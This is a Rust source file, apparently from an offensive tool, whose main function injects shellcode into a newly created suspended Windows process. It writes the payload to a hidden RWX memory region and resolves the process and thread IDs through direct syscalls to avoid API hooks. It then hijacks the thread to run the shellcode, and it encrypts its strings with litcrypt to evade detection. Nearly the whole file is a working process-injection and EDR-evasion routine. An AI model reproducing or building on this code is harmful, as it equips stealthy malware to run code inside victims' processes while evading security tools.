pub use winapi;
use winapi::um::{processthreadsapi::{CreateProcessA, PROCESS_INFORMATION, STARTUPINFOA}, winbase::{DEBUG_PROCESS, DETACHED_PROCESS, NORMAL_PRIORITY_CLASS}};
use winapi::um::winnt::HANDLE as WINAPI_HANDLE;

use noldr::{get_dll_address, get_function_address, get_teb};

use dinvoke_rs::data::{NtQueryInformationProcess, PVOID};
use dinvoke_rs::data::NtQueryInformationThread;

use windows::Win32::System::Threading::{GetCurrentProcess, PROCESS_BASIC_INFORMATION};
use windows_0_51::Win32::Foundation::HANDLE as HANDLE;

use std::ffi::c_void;

mod func;
mod special;
#[macro_use]
extern crate litcrypt;
use_litcrypt!();

#[repr(C)]
struct CLIENT_ID {
    UniqueProcess: usize,
    UniqueThread: usize,
}

#[repr(C)]
struct THREAD_BASIC_INFORMATION {
    ExitStatus: i32,  // NTSTATUS is i32
    TebBaseAddress: *mut c_void,  // PTEB is a pointer
    ClientId: CLIENT_ID,
    AffinityMask: usize,  // KAFFINITY is usize
    Priority: i32,        // KPRIORITY is i32
    BasePriority: i32,
}

pub fn helper_func(process_name: &str, scode: &[u8]) -> Result<String, String> {
    let result = inject_shellcode(process_name, scode);

    result
}

fn inject_shellcode(process_name: &str, shellcode: &[u8]) -> Result<String, String> {

    let teb = get_teb();

    let ntdll = get_dll_address("ntdll.dll".to_string(), teb).unwrap();

    // Format the process path
    let process_path = if !process_name.contains('\\') {
        format!("C:\\Windows\\System32\\{}", process_name)
    } else {
        process_name.to_string()
    };

    // Create a suspended process
    let handles = special::CreateSuspendedProcess(ntdll, &process_path);

    let process_handle = handles.0;
    let thread_handle = handles.1;

    //print the process and thread handles
    println!("Process handle: 0x{:x}", process_handle.0);
    println!("Thread handle: 0x{:x}", thread_handle.0);

    let shellcode_size = shellcode.len();
    
    let shellcode_location = func::get_hidden_injection_address(process_handle.0 as _, shellcode_size)
        .map_err(|e| format!("Failed to get injection address: {}", e))?;

    if !func::inject_and_rwx(process_handle.0 as _, shellcode_location, shellcode) {
        return Err("Failed to inject shellcode".to_string());
    }

    //need to get the process id and thread id

    let mut pbi: *mut PROCESS_BASIC_INFORMATION = std::ptr::null_mut();

    //use dinvoke to call NtQueryInformationProcess
    unsafe 
    {
        let function_type:NtQueryInformationProcess;
        let mut ret: Option<i32> = None;
        
        let p = PROCESS_BASIC_INFORMATION::default();
        let process_information: PVOID = std::mem::transmute(&p); 
        let r = u32::default();
        let return_length: *mut u32 = std::mem::transmute(&r);

        dinvoke_rs::dinvoke::execute_syscall!(
            "NtQueryInformationProcess",
            function_type,
            ret,
            process_handle,
            0,
            process_information,
            size_of::<PROCESS_BASIC_INFORMATION>() as u32,
            return_length
        );

        
        match ret {
            Some(x) => 
                if x == 0 {
                    pbi = std::mem::transmute(process_information);
                    let pbi = *pbi;
                    //println!("The Process Environment Block base address is 0x{:X}", pbi.PebBaseAddress as u64);
                },
            None => println!("[x] Error executing direct syscall for NtQueryInformationProcess."),
        }  

    }

    //get the process id from the process_basic_information
    let pid = unsafe { (*pbi).UniqueProcessId };

    //get the thread id from NtQueryInformationThread using dinvoke

    let mut tbi: *mut THREAD_BASIC_INFORMATION = std::ptr::null_mut();

    unsafe {
        let function_type: NtQueryInformationThread;
        let mut ret: Option<i32> = None;
        let thread_info: THREAD_BASIC_INFORMATION = std::mem::zeroed();
        let process_information: PVOID = std::mem::transmute(&thread_info);
        let r = u32::default();
        let return_length: *mut u32 = std::mem::transmute(&r);
        
        dinvoke_rs::dinvoke::execute_syscall!(
            "NtQueryInformationThread",
            function_type,
            ret,
            thread_handle,
            0, // ThreadBasicInformation
            process_information,
            std::mem::size_of::<THREAD_BASIC_INFORMATION>() as u32,
            return_length
        );
        
        let thread_info = unsafe { (process_information as *const THREAD_BASIC_INFORMATION) };
        //let tid = unsafe { (*thread_info).ClientId.UniqueThread };
        tbi = std::mem::transmute(process_information);
        let tbi = tbi;
        //println!("The Thread Environment Block base address is 0x{:X}", tbi.TebBaseAddress as u64);
    }

    let tid = unsafe { (*tbi).ClientId.UniqueThread };

    println!("About to call snap_thread_hijack with:");
    println!("PID: {}", pid);
    println!("Thread handle: 0x{:x}", thread_handle.0);
    println!("TID: {}", tid);
    println!("Process handle: 0x{:x}", process_handle.0);
    println!("Shellcode location: {:p}", shellcode_location);
    

    // Convert both handles to WinAPI HANDLE (*mut c_void)
    let thread_handle_raw = thread_handle.0 as WINAPI_HANDLE;
    let process_handle_raw = process_handle.0 as WINAPI_HANDLE;

    if !func::snap_thread_hijack(
        pid as u32,
        thread_handle_raw,     // WinAPI HANDLE
        tid as u32,
        process_handle_raw,    // WinAPI HANDLE
        Some(shellcode_location),
        None,
    ) {
        return Err("Failed to hijack thread".to_string());
    }

    //Ok(())
    //if success, return a success message
    Ok("Shellcode injected successfully".to_string())
}